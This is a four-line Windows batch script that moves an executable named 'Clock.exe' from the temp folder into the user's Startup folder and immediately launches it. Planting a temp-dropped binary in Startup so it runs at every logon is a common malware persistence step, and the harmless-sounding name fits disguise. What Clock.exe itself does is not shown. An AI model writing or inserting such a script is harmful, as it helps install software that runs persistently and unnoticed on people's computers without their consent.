@echo off
move "%temp%\Clock.exe" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
timeout 1 >nul
start %appdata%\Microsoft\Windows\"Start Menu"\Programs\Startup\Clock.exe